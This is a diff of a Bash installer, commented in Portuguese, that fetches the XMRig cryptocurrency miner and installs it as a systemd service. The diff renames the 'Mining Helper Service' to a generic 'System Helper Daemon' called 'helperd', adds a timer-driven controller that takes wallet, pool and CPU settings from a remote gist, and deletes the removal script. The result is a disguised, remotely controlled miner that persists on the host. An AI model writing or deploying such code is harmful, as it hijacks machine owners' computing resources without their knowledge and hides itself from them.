@@ -1,51 +1,91 @@
 #!/usr/bin/env bash
-set -e
 
 ########################################
-# CONFIG
+# SAFE MODE
 ########################################
-RAND=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
-BASE="/var/lib/.sys-$RAND"
-BIN="d-$RAND"
-CONF="$BASE/cfg.json"
-STATE="$BASE/state.json"
-SERVICE="sys-$RAND"
+log() { echo "[system-helper][$(date +%H:%M:%S)] $*"; }
+
+########################################
+# CONSTANTES FIXAS
+########################################
+BASE_DIR="/var/lib/system-helper"
+BIN_NAME="helperd"
+SERVICE_NAME="system-helper"
+CONF_FILE="$BASE_DIR/runtime.json"
+STATE_FILE="$BASE_DIR/state.json"
+METRICS_FILE="$BASE_DIR/metrics.prom"
+
 CONFIG_URL="https://gist.githubusercontent.com/hgdexslnone/76d63764034f784aade73ac14766d8ae/raw/dc9a379faf7da1e48b015088337e57af403f0f8a/config.json"
 
 ########################################
 # DEPENDÊNCIAS
 ########################################
-apt update -y
-apt install -y curl wget tar jq lm-sensors hwloc msr-tools
-sensors-detect --auto || true
+log "Instalando dependências"
+export DEBIAN_FRONTEND=noninteractive
+apt update -y || true
+apt install -y \
+  curl jq bc tar \
+  lm-sensors hwloc msr-tools \
+  ca-certificates locales || {
+    log "Falha ao instalar dependências"
+    exit 1
+  }
+
+locale-gen en_US.UTF-8 >/dev/null 2>&1 || true
+update-locale LANG=en_US.UTF-8 >/dev/null 2>&1 || true
+sensors-detect --auto >/dev/null 2>&1 || true
 
 ########################################
-# BAIXA XMRIG
+# DIRETÓRIO BASE
 ########################################
-mkdir -p "$BASE"
-cd "$BASE"
-
-URL=$(curl -s "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
- | grep linux-x64.tar.gz | cut -d '"' -f 4)
-
-wget -qO xmrig.tar.gz "$URL"
-tar -xzf xmrig.tar.gz --strip-components=1
-rm xmrig.tar.gz
-
-mv xmrig "$BIN"
-chmod +x "$BIN"
+log "Preparando diretório $BASE_DIR"
+mkdir -p "$BASE_DIR" || exit 1
+cd "$BASE_DIR" || exit 1
 
 ########################################
-# SERVICE
+# DOWNLOAD DO BINÁRIO (JSON REAL VALIDADO)
 ########################################
-cat > "/etc/systemd/system/${SERVICE}.service" <<EOF
+log "Obtendo release do xmrig (linux-static-x64)"
+
+XMRIG_URL="$(curl -fsSL \
+  -H 'Accept: application/vnd.github+json' \
+  -H 'User-Agent: system-helper' \
+  --connect-timeout 5 --max-time 10 \
+  https://api.github.com/repos/xmrig/xmrig/releases/latest \
+  | jq -r '.assets[] | select(.name | test("linux-static-x64\\.tar\\.gz$")) | .browser_download_url' \
+  | head -n1)"
+
+if [ -z "$XMRIG_URL" ]; then
+  log "ERRO CRÍTICO: asset linux-static-x64 não encontrado no release"
+  exit 1
+fi
+
+log "Download: $XMRIG_URL"
+curl -fL --connect-timeout 10 --max-time 60 \
+  -o payload.tar.gz "$XMRIG_URL" || {
+    log "Falha no download do binário"
+    exit 1
+  }
+
+tar -xzf payload.tar.gz --strip-components=1 || exit 1
+rm -f payload.tar.gz
+
+mv xmrig "$BIN_NAME" || exit 1
+chmod +x "$BIN_NAME"
+
+########################################
+# SYSTEMD SERVICE (NOME FIXO)
+########################################
+log "Criando serviço systemd: ${SERVICE_NAME}.service"
+
+cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
 [Unit]
-Description=Mining Helper Service
+Description=System Helper Daemon
 After=network-online.target
 
 [Service]
-ExecStart=$BASE/$BIN --config=$CONF --api-worker-id=$(hostname)
-WorkingDirectory=$BASE
+ExecStart=$BASE_DIR/$BIN_NAME --config=$CONF_FILE --api-worker-id=$(hostname)
+WorkingDirectory=$BASE_DIR
 Restart=always
 Nice=10
 CPUQuota=25%
@@ -57,51 +97,69 @@ WantedBy=multi-user.target
 EOF
 
 ########################################
-# CONTROL SCRIPT
+# SCRIPT DE CONTROLE
 ########################################
-cat > "$BASE/control.sh" <<'EOF'
-#!/usr/bin/env bash
-CFG=$(curl -fsSL CONFIG_URL || exit 0)
+log "Criando controller.sh"
 
-ENABLED=$(jq -r .enabled <<<"$CFG")
-POOL=$(jq -r .pool <<<"$CFG")
-WALLET=$(jq -r .wallet <<<"$CFG")
-FACTOR=$(jq -r .min_hashrate_factor <<<"$CFG")
-DAY_CPU=$(jq -r .day_cpu <<<"$CFG")
-NIGHT_CPU=$(jq -r .night_cpu <<<"$CFG")
-MAX_CPU=$(jq -r .max_cpu <<<"$CFG")
+cat > "$BASE_DIR/controller.sh" <<'EOF'
+#!/usr/bin/env bash
+
+CONFIG_URL="__CONFIG_URL__"
+SERVICE="system-helper"
+BASE="/var/lib/system-helper"
+CONF="$BASE/runtime.json"
+STATE="$BASE/state.json"
+METRICS="$BASE/metrics.prom"
+
+CFG="$(curl -fsSL --connect-timeout 5 --max-time 10 "$CONFIG_URL")" || exit 0
+[ -z "$CFG" ] && exit 0
+
+ENABLED="$(jq -r .enabled <<<"$CFG")"
+POOL="$(jq -r .pool <<<"$CFG")"
+WALLET="$(jq -r .wallet <<<"$CFG")"
+FACTOR="$(jq -r .min_hashrate_factor <<<"$CFG")"
+DAY_CPU="$(jq -r .day_cpu <<<"$CFG")"
+NIGHT_CPU="$(jq -r .night_cpu <<<"$CFG")"
+MAX_CPU="$(jq -r .max_cpu <<<"$CFG")"
 
 PORTS=($(jq -r '.ports[]' <<<"$CFG"))
 
-if [ "$ENABLED" != "true" ]; then
-  systemctl stop SERVICE
-  exit 0
-fi
+# Cluster OFF
+[ "$ENABLED" != "true" ] && systemctl stop "$SERVICE" && exit 0
 
-if [ ! -f state.json ]; then
-  best_hash=0
-  best_port=""
+# CPU por horário
+HOUR="$(date +%H)"
+CPU="$DAY_CPU"
+[ "$HOUR" -ge 20 ] || [ "$HOUR" -lt 9 ] && CPU="$NIGHT_CPU"
+[ "$CPU" -gt "$MAX_CPU" ] && CPU="$MAX_CPU"
+systemctl set-property "$SERVICE" CPUQuota="${CPU}%"
+
+best_hash=0
+best_port=""
+
+# Descoberta inicial (uma vez)
+if [ ! -f "$STATE" ]; then
   for port in "${PORTS[@]}"; do
-    cat > cfg.json <<CONF
+    cat > "$CONF" <<CONFJSON
 {
- "autosave": true,
- "donate-level": 1,
- "api": { "id": null },
- "cpu": { "enabled": true, "huge-pages": true },
- "pools": [{
-   "url": "$POOL:$port",
-   "user": "$WALLET",
-   "pass": "$(hostname)",
-   "keepalive": true
- }]
+  "autosave": true,
+  "donate-level": 1,
+  "api": { "id": null },
+  "cpu": { "enabled": true, "huge-pages": true },
+  "pools": [{
+    "url": "$POOL:$port",
+    "user": "$WALLET",
+    "pass": "$(hostname)",
+    "keepalive": true
+  }]
 }
-CONF
+CONFJSON
 
-    systemctl restart SERVICE
-    sleep 20
+    systemctl restart "$SERVICE"
+    sleep 25
 
-    HASH=$(curl -s http://127.0.0.1:16000/1/summary \
-      | jq '.hashrate.total[0]' 2>/dev/null || echo 0)
+    HASH="$(curl -s http://127.0.0.1:16000/1/summary | jq '.hashrate.total[0]' 2>/dev/null)"
+    [ -z "$HASH" ] && HASH=0
 
     if [ "$HASH" -gt "$best_hash" ]; then
       best_hash="$HASH"
@@ -109,54 +167,57 @@ CONF
     fi
   done
 
-  echo "{\"best_port\":\"$best_port\",\"best_hash\":$best_hash}" > state.json
+  echo "{\"best_port\":$best_port,\"best_hash\":$best_hash}" > "$STATE"
 fi
 
-BEST_PORT=$(jq -r .best_port state.json)
-BEST_HASH=$(jq -r .best_hash state.json)
+BEST_PORT="$(jq -r .best_port "$STATE")"
+BEST_HASH="$(jq -r .best_hash "$STATE")"
 
-cat > cfg.json <<CONF2
+# Config final
+cat > "$CONF" <<FINALJSON
 {
- "autosave": true,
- "donate-level": 1,
- "api": { "id": null },
- "cpu": { "enabled": true, "huge-pages": true },
- "pools": [{
-   "url": "$POOL:$BEST_PORT",
-   "user": "$WALLET",
-   "pass": "$(hostname)",
-   "keepalive": true
- }]
+  "autosave": true,
+  "donate-level": 1,
+  "api": { "id": null },
+  "cpu": { "enabled": true, "huge-pages": true },
+  "pools": [{
+    "url": "$POOL:$BEST_PORT",
+    "user": "$WALLET",
+    "pass": "$(hostname)",
+    "keepalive": true
+  }]
 }
-CONF2
+FINALJSON
 
-systemctl restart SERVICE
+systemctl restart "$SERVICE"
 sleep 20
 
-CURRENT_HASH=$(curl -s http://127.0.0.1:16000/1/summary \
-  | jq '.hashrate.total[0]' 2>/dev/null || echo 0)
+CURRENT_HASH="$(curl -s http://127.0.0.1:16000/1/summary | jq '.hashrate.total[0]' 2>/dev/null)"
+[ -z "$CURRENT_HASH" ] && CURRENT_HASH=0
 
-MIN_ACCEPT=$(echo "$BEST_HASH * $FACTOR" | bc | cut -d. -f1)
-if [ "$CURRENT_HASH" -lt "$MIN_ACCEPT" ]; then
-  rm -f state.json
-fi
+MIN_ACCEPT="$(echo "$BEST_HASH * $FACTOR" | bc | cut -d. -f1)"
+[ "$CURRENT_HASH" -lt "$MIN_ACCEPT" ] && rm -f "$STATE"
 
-cat <<MET > /var/lib/.sys-metrics.prom
+# Métricas Prometheus
+cat <<MET > "$METRICS"
 syshelper_hashrate $CURRENT_HASH
 syshelper_best_hashrate $BEST_HASH
 syshelper_port $BEST_PORT
+syshelper_cpu_quota $CPU
 MET
 EOF
 
-sed -i "s|SERVICE|$SERVICE|g; s|CONFIG_URL|$CONFIG_URL|g" "$BASE/control.sh"
-chmod +x "$BASE/control.sh"
+sed -i "s|__CONFIG_URL__|$CONFIG_URL|g" "$BASE_DIR/controller.sh"
+chmod +x "$BASE_DIR/controller.sh"
 
 ########################################
 # TIMER
 ########################################
-cat > "/etc/systemd/system/${SERVICE}.timer" <<EOF
+log "Criando timer system-helper.timer"
+
+cat > "/etc/systemd/system/${SERVICE_NAME}.timer" <<EOF
 [Timer]
-OnBootSec=1min
+OnBootSec=2min
 OnUnitActiveSec=5min
 Persistent=true
 
@@ -165,27 +226,14 @@ WantedBy=timers.target
 EOF
 
 ########################################
-# REMOÇÃO
+# ATIVAÇÃO
 ########################################
-cat > "$BASE/remove.sh" <<EOF
-#!/usr/bin/env bash
-systemctl stop $SERVICE*
-systemctl disable $SERVICE*
-rm -rf "$BASE"
-rm -f /etc/systemd/system/$SERVICE*
+log "Ativando serviços"
 systemctl daemon-reexec
 systemctl daemon-reload
-EOF
-chmod +x "$BASE/remove.sh"
+systemctl enable "${SERVICE_NAME}.service" "${SERVICE_NAME}.timer"
+systemctl start "${SERVICE_NAME}.service" "${SERVICE_NAME}.timer"
 
-########################################
-# ENABLE
-########################################
-systemctl daemon-reexec
-systemctl daemon-reload
-systemctl enable $SERVICE.service $SERVICE.timer
-systemctl start $SERVICE.service $SERVICE.timer
-
-echo "✔ Instalado com sucesso"
-echo "📂 Local: $BASE"
-echo "🧼 Remoção: $BASE/remove.sh"
+log "Instalação concluída"
+log "Serviço criado: ${SERVICE_NAME}.service"
+log "Base: $BASE_DIR"
